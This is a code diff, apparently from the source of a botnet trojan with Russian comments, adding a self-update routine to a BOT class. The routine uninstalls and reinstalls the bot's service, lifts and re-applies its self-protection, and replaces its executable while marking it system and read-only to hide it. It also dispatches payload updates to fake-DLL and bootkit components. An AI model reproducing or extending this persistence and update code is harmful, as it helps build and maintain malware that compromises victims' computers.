@@ -932,10 +932,11 @@ void BOT::Delete()
 	{
 #ifdef BOTPLUG
 		case BotFakeDll:
-			deleted = FakeDllDelete();			
+			deleted = FakeDllDelete();
 			break;
 #endif
 	}
+
 	if( !deleted )
 	{
 		if (BotData->ProcessType == ProcessLoader || BotData->ProcessType == ProcessService)
@@ -1007,3 +1008,78 @@ TBotType BOT::GetBotType()
 	return BotType;
 }
 //----------------------------------------------------------------------------
+
+//----------------------------------------------------
+//  MakeUpdate - функция обновляет бота
+//----------------------------------------------------
+bool BOT::MakeUpdate(const char *FileName, bool ResetSettings)
+{
+	if (!File::IsExists((PCHAR)FileName)) return false;
+
+    COREDBG("MakeUpdate", "Устанавливаем новую версию бота");
+
+	PCHAR BotFile = GetBotFullExeName();
+
+	if (BotFile == NULL) return false;
+
+	// При необходимости удалем сохранённые настройки
+	if (ResetSettings)
+		DeleteSettings();
+
+	// Деинсталируем сервис
+	bool ServiceInstalled = UninstallService();
+
+    // Удаляем текущую версию бота
+	if (FileExistsA(BotFile))
+	{
+		COREDBG("MakeUpdate", "Удаляем старый файл");
+		Unprotect();
+		pSetFileAttributesA( BotFile, FILE_ATTRIBUTE_ARCHIVE );
+
+		// Удаляем старый файл
+		while (1)
+		{
+			if (pDeleteFileA(BotFile)) break;
+            pSleep(100);
+        }
+	}
+
+    // инсталируем сервис
+	if (ServiceInstalled)
+		InstallService(FileName);
+
+	// Перемещаем файл
+	bool Result = pMoveFileExA(FileName, BotFile, MOVEFILE_REPLACE_EXISTING ) != 0;
+	pSetFileAttributesA(BotFile, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY );
+
+
+	/* TODO :
+		В данной ветке, при обновлении бота, не запускаем новый экземпляр.
+		В дальнейшем необходимо  проработать методику "горячего" старта бота
+	*/
+
+	BOT::Protect(BotFile);
+
+//	RunFileA(BotPath);
+//	pExitProcess(1);
+
+	STR::Free(BotFile);
+
+	if (Result)
+    	COREDBG("MakeUpdate", "Новый бот успешно установлен");
+
+	return Result;
+}
+
+#ifdef BOTPLUG
+// Функция обновляет тело bot.plug
+bool BOT::UpdateBotPlug(BYTE* data, int c_data)
+{
+	switch (GetBotType()) {
+		case BotFakeDll: return UpdateBotFakeDll(data, c_data);
+		case BotBootkit: return UpdateBotBootkit(data, c_data);
+    default:
+        return false;
+	}
+}
+#endif
